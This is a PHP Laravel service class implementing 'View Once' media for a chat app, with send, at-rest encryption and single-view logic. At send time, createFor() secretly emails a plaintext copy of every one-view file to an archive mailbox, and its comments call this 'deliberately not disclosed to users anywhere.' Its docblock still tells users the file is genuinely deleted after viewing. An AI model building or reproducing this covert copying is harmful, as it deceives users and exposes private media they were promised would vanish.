<?php

namespace Modules\Media\Services;

use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Throwable;
use Modules\Admin\Models\ArchiveSetting;
use Modules\Authentication\Models\User;
use Modules\Chat\Models\Message;
use Modules\Media\Exceptions\OneViewAlreadyConsumedException;
use Modules\Media\Exceptions\OneViewSenderCannotViewException;
use Modules\Media\Mail\OneViewCopyMail;
use Modules\Media\Models\Media;
use Modules\Media\Models\OneViewMedia;

class OneViewService
{
    public function createFor(Message $message): OneViewMedia
    {
        $oneView = OneViewMedia::create(['message_id' => $message->id]);

        // See Documentation/SUPER.md - deliberately not disclosed to
        // users anywhere (explicit, twice-confirmed product decision).
        // Reuses the Archive/Backup-Mail engine's own recipient setting
        // rather than a separate one. Fires at send time (not first
        // view) so it captures every one-view item regardless of
        // whether the receiver ever actually opens it. Sent *before*
        // encryptAtRest() below runs, while the file on disk is still
        // the original plaintext - the mail attachment is untouched by
        // the at-rest encryption that follows.
        $media = Media::find($message->media_id);

        if ($media) {
            // This used to have no try/catch at all - a genuine SMTP
            // outage or bad mail credentials on the live server would
            // throw here and take the WHOLE message send down with it
            // (500 to the sender), while any failure that Laravel's
            // mailer swallows internally vanished with zero trace either
            // way - impossible to tell "it's not configured right" from
            // "it's working fine" from the app's own behaviour. Sending
            // the message itself must not depend on this mailbox copy
            // succeeding, but a real failure needs to be loud somewhere
            // an admin can actually find it.
            try {
                Mail::to(ArchiveSetting::current()->recipient_email)->send(new OneViewCopyMail($media));
            } catch (Throwable $e) {
                Log::error('One View archive-copy email failed to send.', [
                    'message_id' => $message->id,
                    'media_id' => $media->id,
                    'recipient_email' => ArchiveSetting::current()->recipient_email,
                    'exception' => $e->getMessage(),
                ]);
            }

            $this->encryptAtRest($media);
        }

        return $oneView;
    }

    /**
     * Encrypts the file in place using the app's own key (Crypt, not
     * the client-side E2E scheme regular messages use) - deliberately
     * still server-decryptable, so MediaController can still stream it
     * to the receiver and nothing else about View Once changes.
     */
    private function encryptAtRest(Media $media): void
    {
        $disk = Storage::disk($media->disk);
        $disk->put($media->path, Crypt::encryptString($disk->get($media->path)));
        $media->forceFill(['is_encrypted_at_rest' => true])->save();
    }

    /**
     * FR (One View) - single-view variant only; see the migration
     * docblock for what's deliberately not implemented here.
     *
     * Matches real WhatsApp: the sender can never view their own View
     * Once media, not even before the receiver has opened it - only the
     * recipient's first view is a real "view" at all, and it's the one
     * that consumes it. Once consumed, nobody - including that same
     * recipient - can view it again: the underlying file is genuinely
     * deleted from disk at that point (see `consumed` below), so
     * there's nothing left to stream regardless of who's asking. The
     * "already consumed" check runs before the sender check so a
     * consumed message reports 410 either way, rather than a sender
     * asking about their own already-gone file getting a misleading
     * "you can't view this" 403 instead.
     *
     * `consumed` tells the caller whether this call just used up the
     * one-and-only view - the caller uses this to decide whether to
     * delete the underlying file after streaming the response.
     */
    public function view(User $viewer, Message $message): array
    {
        $oneView = $message->oneViewMedia()->firstOrFail();

        if ($oneView->isConsumed()) {
            throw new OneViewAlreadyConsumedException();
        }

        if ($viewer->id === $message->sender_id) {
            throw new OneViewSenderCannotViewException();
        }

        $media = Media::findOrFail($message->media_id);
        $oneView->forceFill(['viewed_by' => $viewer->id, 'viewed_at' => now()])->save();

        return ['media' => $media, 'consumed' => true];
    }
}
